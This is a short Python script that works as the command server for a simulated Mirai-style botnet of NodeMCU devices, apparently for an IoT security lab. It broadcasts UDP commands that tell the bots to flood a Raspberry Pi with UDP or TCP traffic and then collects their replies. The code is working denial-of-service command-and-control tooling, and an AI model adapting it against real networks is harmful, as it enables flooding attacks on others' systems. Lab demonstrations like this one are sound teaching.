#!/usr/bin/env python3
"""Bot master: commands the NodeMCU 'bots' (simulated botnet, like Mirai's command server).

python bot.py udp 10       all bots flood the Pi with UDP for 10 s
python bot.py tcp 10       all bots flood the Pi with TCP for 10 s
python bot.py stop         all bots stop and go back to being sensors

How the command travels: ONE UDP broadcast packet (to 255.255.255.255, port 6667) with the text "udp 10".
Every device on the Wi-Fi receives it; only our bots listen on port 6667. No IP of any bot is needed.
The command never goes through the Pi's broker. The bots answer back to this laptop (UDP, same port).
What the bots attack is fixed in their firmware: only the Pi (GATEWAY_IP), at most 30 s.
"""
import socket
import sys
import time

BOT_PORT = 6667


def my_ip():
    """The laptop's IP on the network (the card that has the internet route). Sends nothing."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return "0.0.0.0"
    finally:
        s.close()


def send_to_bots(kind, seconds=10):
    command = "stop" if kind == "stop" else f"{kind} {seconds}"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.bind((my_ip(), 0))                       # send on the Wi-Fi card, not on a Docker/VPN card
    s.sendto(command.encode(), ("255.255.255.255", BOT_PORT))
    print(f"broadcast to all bots: '{command}'")

    s.settimeout(0.5)                          # show the bots' answers ("node1: udp flood started ...")
    end = time.time() + (2 if kind == "stop" else seconds + 3)
    answers = 0
    while time.time() < end:
        try:
            text, (ip, _) = s.recvfrom(200)
            print(f"  {ip}  {text.decode(errors='replace')}")
            answers += 1
        except (socket.timeout, ConnectionResetError):   # (Windows reports stray errors here; ignore them)
            pass
    s.close()
    if answers == 0:
        print("no bot answered (are they on the same Wi-Fi? is broadcast blocked?)")


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("udp", "tcp", "stop"):
        raise SystemExit("use:  python bot.py udp|tcp|stop [seconds]")
    send_to_bots(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 10)
